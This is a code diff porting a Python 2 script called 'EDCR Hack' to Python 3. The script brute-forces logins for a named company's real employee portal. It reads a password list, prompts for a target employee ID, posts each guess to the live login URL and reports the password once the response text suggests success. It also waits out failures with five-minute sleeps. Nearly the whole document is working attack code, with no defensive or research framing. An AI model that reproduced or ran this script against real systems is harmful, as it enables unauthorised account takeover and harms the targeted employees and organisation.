@@ -1,55 +1,68 @@
 import time
 import sys
+import requests
+from bs4 import BeautifulSoup
 
-if sys.version_info[0] !=2: 
-        print('''--------------------------------------
-        REQUIRED PYTHON 2.x
-        use: python EDCR.py
+# Check Python version
+if sys.version_info[0] != 3:
+    print('''--------------------------------------
+    REQUIRED PYTHON 3.x
+    use: python3 EDCR.py
+			By Mostafijur Rahhamn
 --------------------------------------
-                        ''')
-        sys.exit()
+    ''')
+    sys.exit()
 
-post_url=https://edcr.squaregroup.com/
+# Target URL and headers
+post_url = "https://edcr.squaregroup.com/"
 headers = {
-        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
-try:
-        import mechanize
-        import urllib2
-        browser = mechanize.Browser()
-        browser.addheaders = [('User-Agent',headers['User-Agent'])]
-        browser.set_handle_robots(False)
-except:
-        print('\n\tPlease install mechanize.\n')
-        sys.exit()
-
 print('\n---------- EDCR Hack by Moxaclav ----------\n')
-file=open('passwords.txt','r')
 
-email=str(raw_input('Enter ID : ').strip())
+# Read passwords from file
+try:
+    with open('passwords.txt', 'r') as file:
+        passwords = file.readlines()
+except FileNotFoundError:
+    print("Error: 'passwords.txt' file not found.")
+    sys.exit()
 
-print ("\nTarget Employee ID : ",email)
-print "\nTrying Passwords from list ..."
+# Get user input for email/ID
+email = input('Enter ID: ').strip()
+print("\nTarget Employee ID:", email)
+print("\nTrying Passwords from list...")
 
-i=0
-while file:
-        passw=file.readline().strip()
-        i+=1
-        if len(passw) < 6:
-                continue
-        print str(i) +" : ",passw
-        response = browser.open(post_url)
-        try:
-                if response.code == 200:
-                        browser.select_form(nr=0)
-                        browser.form['email'] = email
-                        browser.form['pass'] = passw
-                        response = browser.submit()
-                        response_data = response.read()
-                        if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-                                print('Your password is : ',passw)
-                                break
-        except:
-                print('\nSleeping for time : 5 min\n')
-                time.sleep(300)
+# Initialize session
+session = requests.Session()
+session.headers.update(headers)
+
+# Loop through passwords
+for i, passw in enumerate(passwords, start=1):
+    passw = passw.strip()
+    if len(passw) < 6:
+        continue
+
+    print(f"{i} : {passw}")
+
+    try:
+        # Send POST request with email and password
+        payload = {
+            'email': email,
+            'pass': passw,
+        }
+        response = session.post(post_url, data=payload)
+        response_data = response.text
+
+        # Check for success indicators in the response
+        if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+            print('Your password is:', passw)
+            break
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+        print("\nSleeping for 5 minutes...\n")
+        time.sleep(300)
+
+print("\nPassword cracking process completed.")
